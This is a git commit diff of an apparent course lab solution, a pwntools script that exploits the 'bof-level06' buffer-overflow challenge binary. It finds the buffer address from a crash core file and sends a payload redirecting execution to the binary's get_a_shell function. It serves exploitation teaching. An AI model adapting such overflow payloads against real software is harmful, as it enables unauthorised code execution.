24ff7be1adc9d6de865bf48048bd494e357b88b4
Zenna Allwein <zrallwein@gmail.com>
2026-02-12 19:08:06 -0600

    level 6 done

--- unit2/bof-level06/bof-level06.py
+++ unit2/bof-level06/bof-level06.py
@@ -3,42 +3,42 @@ from pwn import *
 import os
 
 DEBUG = False # toggles gdb.debug or process
-elf = ELF('./bof-level05') # replace this with the actual level
-get_a_shell = p32(elf.symbols["get_a_shell"])
+elf = ELF('./bof-level06') # replace this with the actual level
 
 # crash the process to get a core file and find the buffer address (still boilerplate)
 
-# io = elf.process(env={}, setuid=False)
-# io.sendline(cyclic(10000)) # send 1000 junk characters
-# io.wait()
-# core = io.corefile
-# buffer_address = core.stack.find(cyclic(50))
-# os.unlink(core.path) # delete the file now that we're done with it
+io = elf.process(env={}, setuid=False)
+io.sendline(cyclic(10000)) # send 1000 junk characters
+io.wait()
+core = io.corefile
+buffer_address = core.stack.find(cyclic(50))
+os.unlink(core.path) # delete the file now that we're done with it
 
 # launch the main process (still boilerplate)
 if DEBUG:
     context.log_level = 'DEBUG'
     context.terminal = ['tmux', 'splitw', '-h']
     io = elf.debug(env={}, gdbscript='''
-    b receive_input
-    continue
-    ''')
+b *0x000000000040069b
+continue
+''')
+
 else:
     io = elf.process(env={})
 
 
 # END SETUP BOILERPLATE
 # BEGIN CHALLENGE-SPECIFIC CODE
+get_a_shell = p64(elf.symbols["get_a_shell"])
 
-buf_len = 0x88
-buffer_start = 0xffffdd70
+max_len = 136
 
-our_stack =  b"A" * 4 + get_a_shell
-our_stack_len = 0x8 
-our_stack_addr = p32(buffer_start + buf_len - our_stack_len)
+our_stack =  b"A" * 8 + get_a_shell
+our_stack_len = 16 
+our_stack_addr = p64(buffer_address + max_len - our_stack_len - 8)
 
-payload = (b"A" * (buf_len - our_stack_len)) + our_stack  + our_stack_addr
-io.sendline(payload)
+payload = (b"A" * (max_len - our_stack_len - 8)) + our_stack  + our_stack_addr
+io.send(payload)
 
 # END CHALLENGE-SPECIFIC CODE
 # BEGIN FLAG RETRIEVAL BOILERPLATE
